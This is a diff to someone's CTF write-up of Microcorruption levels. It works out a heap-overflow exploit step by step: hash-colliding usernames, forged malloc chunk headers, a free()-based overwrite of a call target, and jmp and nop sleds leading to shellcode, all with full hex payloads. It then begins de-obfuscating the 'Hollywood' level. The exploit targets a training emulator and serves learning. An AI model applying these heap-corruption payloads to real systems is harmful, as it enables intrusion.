@@ -1775,15 +1775,633 @@ So once we decide what to put here, we'll presumably have to search
 specifically for (or solve for?) inputs that collide with our chosen
 values.
 
+
 * What to overwrite:
 
-If we can in fact leverage this as in Algiers to get an arbitrary
-write, then many possibilities present themselves, but, for example,
-there is no stack randomisation so we should be able to overwrite a
-return pointer on the stack with a shellcode address.  
+  If we can in fact leverage this as in Algiers to get an arbitrary
+  write, then many possibilities present themselves, but, for example,
+  there is no stack randomisation so we should be able to overwrite a
+  return pointer on the stack with a shellcode address.
 
-There were restrictions about the two values following the overwritten
-value in memory needing to be even, but we would guess that through
-appropriately crafted inputs we can make such a condition hold.
+  There were restrictions about the two values following the
+  overwritten value in memory needing to be even, but we would guess
+  that through appropriately crafted inputs we can make such a
+  condition hold.
 
-## 19. ???
+
+
+So, for now, let's try seeing the overwrite in action.  From our
+previous experience with this malloc implementation, we would expect
+that a free on the overflowed chunk should trigger a write of the
+value "ms" to address "sk".  Except "ms" is 0x736d, which is odd and
+therefore not allowed.  So we use "dyzc" instead, as "dy" is 0x7964
+which is even.  Thus:
+
+
+```new bsta 1;new gaae 1;new iggg 1;new kmmi 1;new mssk 1;new dyzc 1;new a 1;new b 2;new c 3;new d 4;new e 5;new f 6;new g 7;new h 8;new i 9;new j 10;new k 11;new l 12```
+
+This results in an output of:
+
+```
+Adding user account bsta with pin 0001.
+Adding user account gaae with pin 0001.
+Adding user account iggg with pin 0001.
+Adding user account kmmi with pin 0001.
+Adding user account mssk with pin 0001.
+Adding user account dyzc with pin 0001.
+Adding user account a with pin 0001.
+Adding user account b with pin 0002.
+Adding user account c with pin 0003.
+Adding user account d with pin 0004.
+Adding user account e with pin 0005.
+Adding user account f with pin 0006.
+[[rehash happens here]]
+Heap exausted; aborting.
+```
+
+The overwriting does not seem to occur, as this happens on a malloc
+call before any frees have taken place.  Why does malloc do this?
+Unclear.  Until now, we've been very intentionally keep malloc as a
+black box, but this may be the time to open that box and peer inside.
+It isn't too big anyways.
+
+After some staring, we come to the following cartoon version of the
+malloc function:
+
+* Each chunk starts with a 3-word header: {prev_chunk:16}{next_chunk:16}{size:15}{allocated?:1}
+
+* Malloc will start with the first chunk and simply walk along the
+  linked list of chunks checking for a free chunk (based on
+  `allocated?` bit) that is big enough to service the request (based
+  on `size` bits).
+
+* If it finds one, if breaks up the chunk
+ 
+  ```
+  first_match: 
+  prev_chunk:16
+  next_chunk:16
+  {chunk_size:15,0:1}:16
+  chunk_bytes:chunk_size
+  ```
+
+  Into: 
+
+  ```
+  first_match: 
+  prev_chunk:16
+  new_chunk:16
+  {requested_size:15,1:1}:16
+  chunk_bytes:requested_size
+
+  new_chunk:
+  first_match:16
+  next_chunk:16
+  {chunk_size-requested_size:15,0:1}:16
+  new_chunk_bytes:(chunk_size-requested_size)
+  ```
+
+* If ever the next chunk address is numerically previous to the
+  current chunk address, the heap is deemed to be "exhausted".  Aha!
+
+So this is what's happening: rehash first calls malloc for all the new
+buckets/metadata before it frees the old ones.  These malloc calls
+malloc walk through the chunk list and see our modified chunk which
+sends the walking of the linked list off the rails.
+
+Wonderful.  So our new strategy is: 
+
+1. Overflow the chunk for bucket n to overwrite the chunk headers for
+   bucket n+1.  
+
+2. Write the chunk headers of bucket n+1 with pointers backwards to
+   bucket n (as normal), but forwards to bucket n+3 as the next chunk
+
+3. Overflow the chunk for bucket n+1 so that the headers of bucket n+2
+   (which will now be skipped in the chunk linked list traversal) are
+   under our control, but will not screw up the `malloc` calls that
+   `rehash` performs prior to doing the `free` that gives us control.
+
+One small wrinkle in executing this plan is that it appears it will
+require even more control over hash values than we previously
+anticipated, since we'll want specific values to be parts of the
+username.  
+
+Thankfully, though making the hashes agree is one thing, making the
+buckets agree might just be a matter of making the hashes agree modulo
+8.
+
+This is confirmed to us by the code that handles the output of the
+hash function:
+
+```
+4870:  b012 0e48      call	#0x480e <hash>
+4874:  1c43           mov	#0x1, r12
+4876:  1e4b 0200      mov	0x2(r11), r14
+487a:  0e93           tst	r14
+487c:  0324           jz	#0x4884 <add_to_table+0x52>
+487e:  0c5c           add	r12, r12
+4880:  1e83           dec	r14
+4882:  fd23           jnz	#0x487e <add_to_table+0x4c>
+4884:  3c53           add	#-0x1, r21
+```
+
+r12 gets repeatedly doubled untli it is the numbre of buckets, and
+then r15 (which after the call to `hash` contains the hash value) ges
+ANDed with r12-1.  
+
+And for a single character with value x, the hash value is (-x)%8.  So
+if we want to hash to bucket 0, any single character username (except
+the special characters of space, semicolon, and the null byte) should
+work.
+
+*Step 1: Filling the buckets*
+
+So now we're going to have to input in hex.  We start with the below
+annotated payload fragment to fill bucket 0:
+
+```
+6e6577200820303b6e6577201020303b6e6577201820303b6e6577202820303b6e6577203020303b
+n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW;  
+```
+
+Then, similarly to fill bucket 1: 
+
+```
+6e6577200120303b6e6577200920303b6e6577201120303b6e6577201920303b6e6577202120303b
+n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW; n e w _ UN_ PW;  
+```
+
+*Step 2: Overfilling bucket 0*
+
+Recall that when all allocated, the hash table started as: 
+
+```
+5000:   0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
+5010:   0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
+5020:   2252 8252 e252 1050 3c50 2100 0100 0100   "R.R.R.P<P!.....
+5030:   0100 0100 0100 0100 0200 0200 2650 9c50   ............&P.P
+5040:   b500 6800 0000 0000 0000 0000 0000 0000   ..h.............
+5050:   0000 0800 0000 0000 0000 0000 0000 0000   ................
+5060:   *
+5090:   0000 0000 0000 0000 0000 0000 3c50 fc50   ............<P.P
+50a0:   b500 6700 0000 0000 0000 0000 0000 0000   ..g.............
+50b0:   0000 0700 0000 0000 0000 0000 0000 0000   ................
+50c0:   *
+50f0:   0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
+5100:   b500 6600 0000 0000 0000 0000 0000 0000   ..f.............
+5110:   0000 0600 0000 0000 0000 0000 0000 0000   ................
+5120:   *
+5150:   0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
+5160:   b500 6500 0000 0000 0000 0000 0000 0000   ..e.............
+5170:   0000 0500 0000 0000 0000 0000 0000 0000   ................
+5180:   *
+51b0:   0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
+51c0:   b500 6400 0000 0000 0000 0000 0000 0000   ..d.............
+51d0:   0000 0400 0000 0000 0000 0000 0000 0000   ................
+51e0:   *
+```
+
+So the real prev and next chunks for bucket 1 are: 503c and 50fc, and
+for bucket 2 are 509c and 515c.  Thus we want the first five bytes of
+the sixth username added to bucket 0 to be `3c505c51b5`
+(i.e. prev=bucket 0, next=bucket 3,size=whatever,allocated?=1)
+
+So we need a suffix to append to the username `3c505c51b5` to make its
+hash 0 modulo 8.  This is easy:
+
+If s="3c505c51b500" and our username is u="3c505c51b5"+x (the target
+string followed by the single unknown character x), and h is the hash
+function, then h(u)=h(s)+31*x=h(s)-x mod 8.  So it suffices to choose x =
+h(s) mod 8.
+
+In our case, h(s) = 4, so a username of 3c505c51b504, say, should end
+up in bucket 0.  We can test this with the input
+
+```6e6577203c505c51b5042030```
+
+and observe that this user does indeed get placed into bucket 0.
+
+*Step 3: Overfilling bucket 1*
+
+Likewise, the sixth username for bucket 1 will be
+
+```
+{value to use in overwriting}:16
+{address to overwrite}:16
+b5:8
+{value to force username to land in bucket 1}:8
+```
+
+So let's take stock of our input length so far:
+
+* We have 5 8-byte user entries to fill bucket 0
+
+* We have 5 8-byte user entries to fill bucket 1
+
+* We have a 12-byte user entry to mangle bucket 1's headers
+
+* We have a 12-byte user entry to mangle bucket 2's headers
+
+So we're at roughly 34 bytes.  Our input gets placed into memory at
+address 3dec, so if we can cause execution to go to address, say, 3e30
+and we can place shellcode with an appropriately sized nop sled at the
+beginning in our input, we should have success.  So what to overwrite?
+
+So what value to overwrite to get control?
+
+Recall from Algiers we're looking to write an even value at an even
+address with the two words following it also even.  One reasonable
+target for overwriting is the argument to a call.  Looking through the
+`run` function, we see this specimen:
+
+```
+4c98:  3f40 124b      mov	#0x4b12, r15 ;; "User already has an account"
+4c9c:  b012 504d      call	#0x4d50 <puts>
+4ca0:  1c3c           jmp	#0x4cda <run+0x174>
+4ca2:  0a12           push	r10
+4ca4:  0912           push	r9
+```
+
+Note that the target of the call to `puts` is followed by two even
+words.  Also, to trigger this call, we only have to submit a user that
+already has an account, so we repeat one of our earlier user input
+strings.
+
+```
+6e6577200820303b
+6e6577201020303b
+6e6577201820303b
+6e6577202820303b
+6e6577203020303b
+6e6577200120303b
+6e6577200920303b
+6e6577201120303b
+6e6577201920303b
+6e6577202120303b
+6e6577203c505c51b50420303b
+6e657720303e9e4cb50120303b
+6e6577200820303b6e657720
+```
+
+So what is our shellcode?  We did one earlier that was null-free:
+
+```
+mov #0x7f01,r15
+dec r15
+swpb r15
+push r15
+call <INT>
+```
+
+```3f40017f1f838f100f12b012ec4c```
+
+Our nop can be `inc r1`, or `1153`
+
+
+```
+6e6577201020303b
+6e6577203020303b
+6e6577204020303b
+6e6577205020303b
+6e6577206020303b
+
+6e6577200f20303b
+6e6577201f20303b
+6e6577202f20303b
+6e6577203f20303b
+6e6577204f20303b
+
+6e6577203c505c51b50420303b
+6e657720303e9e4cb50120303b
+
+6e6577201020303b
+6e657720
+1153115311531153115311531153115311531153115311531153115311531153
+3f40017f1f838f100f12b012ec4c
+```
+
+The problem now is that we get a rehash just before our last input.
+Bummer.  So we have to trigger this rehash in advance by adding two
+more dummy entries, and then overwrite heap headers for the rehashed
+heap:
+
+```
+6e6577201020303b
+6e6577203020303b
+6e6577204020303b
+6e6577205020303b
+6e6577206020303b
+
+6e6577200f20303b
+6e6577201f20303b
+6e6577202f20303b
+6e6577203f20303b
+6e6577204f20303b
+
+6e6577200520303b
+6e6577201520303b
+
+
+```
+
+
+The filled (but not overflowed) modified heap looks like:
+
+```
+5350:   2e56 8e56 ee56 4e57 ae57 0e58 6e58 ce58   .V.V.VNW.W.XnX.X
+5360:   2e59 3c53 8853 4100 0500 0500 0000 0000   .Y<S.SA.........
+5370:   0000 0000 0000 0000 0000 0000 0000 0200   ................
+5380:   0000 0000 0000 0000 6253 e853 b500 1000   ........bS.S....
+5390:   0000 0000 0000 0000 0000 0000 0000 0000   ................
+53a0:   3000 0000 0000 0000 0000 0000 0000 0000   0...............
+53b0:   0000 4000 0000 0000 0000 0000 0000 0000   ..@.............
+53c0:   0000 0000 5000 0000 0000 0000 0000 0000   ....P...........
+53d0:   0000 0000 0000 6000 0000 0000 0000 0000   ......`.........
+53e0:   0000 0000 0000 0000 8853 4854 b500 0f00   .........SHT....
+53f0:   0000 0000 0000 0000 0000 0000 0000 0000   ................
+5400:   1f00 0000 0000 0000 0000 0000 0000 0000   ................
+5410:   0000 2f00 0000 0000 0000 0000 0000 0000   ../.............
+5420:   0000 0000 3f00 0000 0000 0000 0000 0000   ....?...........
+5430:   0000 0000 0000 4f00 0000 0000 0000 0000   ......O.........
+5440:   0000 0000 0000 0000 e853 a854 b500 0000   .........S.T....
+5450:   *
+54a0:   0000 0000 0000 0000 4854 0855 b500 0000   ........HT.U....
+54b0:   *
+5500:   0000 0000 0000 0000 a854 6855 b500 0000   .........ThU....
+5510:   *
+```
+
+So we want to write to bucket 0 the username 8853a854b50e and then to
+bucket 1 the username 303e9e4cb507 (now the hash has to adjust mod 16).
+
+Following this, we need enough new entries (that don't mess anything
+up) to trigger another rehash which will finally give us control.
+
+```
+# fill bucket 0
+6e6577201020303b
+6e6577203020303b
+6e6577204020303b
+6e6577205020303b
+6e6577206020303b
+
+# fill bucket 1
+6e6577200f20303b
+6e6577201f20303b
+6e6577202f20303b
+6e6577203f20303b
+6e6577204f20303b
+
+# trigger rehash (add to bucket 5)
+6e6577200520303b
+6e6577201520303b
+
+# overflow bucket 0 to hide bucket 2
+6e6577208853a854b50e20303b
+
+# overflow bucket 1 to mangle headers of bucket 2
+6e657720103f9e4cb50720303b
+
+# trigger rehash (therefore overwrite)
+6e6577202520303b
+6e6577203520303b
+6e6577204520303b
+6e6577205520303b
+6e6577206520303b
+6e6577207520303b
+6e6577208520303b
+6e6577209520303b
+6e657720a520303b
+6e657720b520303b
+6e657720c520303b
+6e657720d520303b
+6e657720e520303b
+6e657720f520303b
+6e6577200620303b
+6e6577201620303b
+6e6577202620303b
+6e6577203620303b
+6e6577204620303b
+6e6577205620303b
+
+# trigger "user already exists, jumping to shellcode from overwritten call target"
+6e6577201020303b
+
+# make shellcode look like username
+6e657720
+
+# 043c
+
+# "nop" sled
+1153115311531153115311531153115311531153115311531153115311531153
+
+# shellcode
+3f40017f1f838f100f12b012ec4c
+```
+
+This is very nearly right, except that it overwrites the correct
+address not with the desired value of 3f10 but with the value 5448.
+This is because free only overwrites the previous chunk if it is free,
+meaning our nop sled has to be full of even numbers.  Further, after
+the value overwritten, free will overwrite the next two words with
+some garbage.  So instead our nop sled can be made of `jmp +10`
+instructions, i.e. 043c which is conveniently even.  This sled can be
+followed by another sled of around 10 `inc r4` instructions to make
+sure we transition correctly from our jmp sled to a nop sled to our
+shellcode.
+
+Thus:
+
+```
+# fill bucket 0
+6e6577201020303b
+6e6577203020303b
+6e6577204020303b
+6e6577205020303b
+6e6577206020303b
+
+# fill bucket 1
+6e6577200f20303b
+6e6577201f20303b
+6e6577202f20303b
+6e6577203f20303b
+6e6577204f20303b
+
+# trigger rehash (add to bucket 5)
+6e6577200520303b
+6e6577201520303b
+
+# overflow bucket 0 to hide bucket 2
+6e6577208853a854b50e20303b
+
+# overflow bucket 1 to mangle headers of bucket 2
+6e657720303f9e4cb50720303b
+
+# trigger rehash (therefore overwrite)
+6e6577202520303b
+6e6577203520303b
+6e6577204520303b
+6e6577205520303b
+6e6577206520303b
+6e6577207520303b
+6e6577208520303b
+6e6577209520303b
+6e657720a520303b
+6e657720b520303b
+6e657720c520303b
+6e657720d520303b
+6e657720e520303b
+6e657720f520303b
+6e6577200620303b
+6e6577201620303b
+6e6577202620303b
+6e6577203620303b
+6e6577204620303b
+6e6577205620303b
+
+
+# trigger "user already exists, jumping to shellcode from overwritten call target"
+6e6577201020303b
+
+# make shellcode look like username
+6e657720
+
+# "jmp" sled that will avoid garbage instructions
+
+043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c043c
+
+# "nop" sled of inc r4
+
+14531453145314531453145314531453145314531453
+
+# shellcode
+3f40017f1f838f100f12b012ec4c
+```
+
+And we're in.  
+
+
+## 19. Hollywood
+
+The code is at least mercifully shorter:
+
+```
+0010 <__trap_interrupt>
+0010:  3041           ret
+4400 <main>
+4400:  013c           jmp	#0x4404 <main+0x4>
+4402:  d1a1 3140 0044 dadd.b	0x4031(sp), 0x4400(sp)
+4408:  013c           jmp	#0x440c <main+0xc>
+440a:  d1a1 1542 5c01 dadd.b	0x4215(sp), 0x15c(sp)
+4410:  013c           jmp	#0x4414 <main+0x14>
+4412:  d1a1 75f3 013c dadd.b	-0xc8b(sp), 0x3c01(sp)
+4418:  d1a1 35d0 085a dadd.b	-0x2fcb(sp), 0x5a08(sp)
+441e:  013c           jmp	#0x4422 <main+0x22>
+4420:  d1a1 3f40 0011 dadd.b	0x403f(sp), 0x1100(sp)
+4426:  013c           jmp	#0x442a <main+0x2a>
+4428:  d1a1 0f93 0724 dadd.b	-0x6cf1(sp), 0x2407(sp)
+442e:  013c           jmp	#0x4432 <main+0x32>
+4430:  d1a1 8245 5c01 dadd.b	0x4582(sp), 0x15c(sp)
+4436:  013c           jmp	#0x443a <main+0x3a>
+4438:  d1a1 2f83 0343 dadd.b	-0x7cd1(sp), 0x4303(sp)
+443e:  013c           jmp	#0x4442 <main+0x42>
+4440:  d1a1 1e4f 3446 dadd.b	0x4f1e(sp), 0x4634(sp)
+4446:  013c           jmp	#0x444a <main+0x4a>
+4448:  d1a1 8f4e 0024 dadd.b	0x4e8f(sp), 0x2400(sp)
+444e:  013c           jmp	#0x4452 <main+0x52>
+4450:  d1a1 ef23 013c dadd.b	0x23ef(sp), 0x3c01(sp)
+4456:  d1a1 0f43 0f93 dadd.b	0x430f(sp), -0x6cf1(sp)
+445c:  013c           jmp	#0x4460 <main+0x60>
+445e:  d1a1 0e24 013c dadd.b	0x240e(sp), 0x3c01(sp)
+4464:  d1a1 8245 5c01 dadd.b	0x4582(sp), 0x15c(sp)
+446a:  013c           jmp	#0x446e <main+0x6e>
+446c:  d1a1 1f83 013c dadd.b	-0x7ce1(sp), 0x3c01(sp)
+4472:  d1a1 cf43 0035 dadd.b	0x43cf(sp), 0x3500(sp)
+4478:  013c           jmp	#0x447c <main+0x7c>
+447a:  d1a1 f923 013c dadd.b	0x23f9(sp), 0x3c01(sp)
+4480:  d1a1 3e40 0012 dadd.b	0x403e(sp), 0x1200(sp)
+4486:  013c           jmp	#0x448a <main+0x8a>
+4488:  d1a1 3f40 0024 dadd.b	0x403f(sp), 0x2400(sp)
+448e:  013c           jmp	#0x4492 <main+0x92>
+4490:  d1a1 bf4f feef dadd.b	0x4fbf(sp), -0x1002(sp)
+4496:  013c           jmp	#0x449a <main+0x9a>
+4498:  d1a1 3e53 fa23 dadd.b	0x533e(sp), 0x23fa(sp)
+449e:  013c           jmp	#0x44a2 <main+0xa2>
+44a0:  d1a1 3b40 0c16 dadd.b	0x403b(sp), 0x160c(sp)
+44a6:  013c           jmp	#0x44aa <main+0xaa>
+44a8:  d1a1 0212 013c dadd.b	0x1202(sp), 0x3c01(sp)
+44ae:  d1a1 3040 be44 dadd.b	0x4030(sp), 0x44be(sp)
+44b4 <__stop_progExec__>
+44b4:  32d0 f000      bis	#0xf0, sr
+44b8:  fd3f           jmp	#0x44b4 <__stop_progExec__+0x0>
+44ba <__ctors_end>
+44ba:  3040 3246      br	#0x4632 <_unexpected_>
+4632 <_unexpected_>
+4632:  0013           reti	pc
+```
+
+This is the usual obfuscation technique of "jmp to the middle of an
+instruction".  Disentangling the interesting bits (basically removing
+the word at and the word before any d1a1), we get:
+
+```
+4402:  3140 0044 
+440a:  1542 5c01 
+4412:  75f3 35d0 085a 
+441e:  3f40 0011 
+4426:  0f93 0724 
+442e:  8245 5c01 
+4436:  2f83 0343 
+443e:  1e4f 3446 
+4446:  8f4e 0024 
+444e:  ef23 0f43 0f93 
+445c:  0e24 8245 5c01 
+446a:  1f83 cf43 0035 
+4478:  f923 3e40 0012 
+4486:  3f40 0024 
+448e:  bf4f feef 
+4496:  3e53 fa23 
+449e:  3b40 0c16 
+44a6:  0212 3040 be44 
+```
+
+This we can disassemble, and resolve the relative jmps to get:
+
+```
+	mov	#0x4400, sp
+	mov	&0x015c, r5
+	and.b	#-0x1, r5
+	bis	#0x5a08, r5
+	mov	#0x1100, r15
+	tst	r15
+	jz	lab2 	; 443c
+lab1:	
+	mov	r5, &0x015c ; this is 4432
+	decd	r15
+lab2:	
+	clr	4 	; this is 443c
+	mov	0x4634(r15), r14
+	mov	r14, 0x2400(r15)
+	jnz	lab1 	; 4432
+	clr	r15
+	tst	r15
+	jz	lab4 	; 447e
+	mov	r5, &0x015c
+	dec	r15
+lab3:
+	mov.b	#0x0, 0x3500(r15) ; this is 4470
+	jnz	lab3 	; 4470
+lab4:
+	mov	#0x1200, r14 ; this is 447e
+	mov	#0x2400, r15
+lab5:
+	mov	@r15+, -0x1002(r15) ; this is 4492
+	add	#-0x1, r14
+	jnz	lab5 	; 4492
+	mov	#0x160c, r11
+	push	sr
+	br	#0x44be
+```
+
+(Possibly some mistake in there, but will revisit later.)
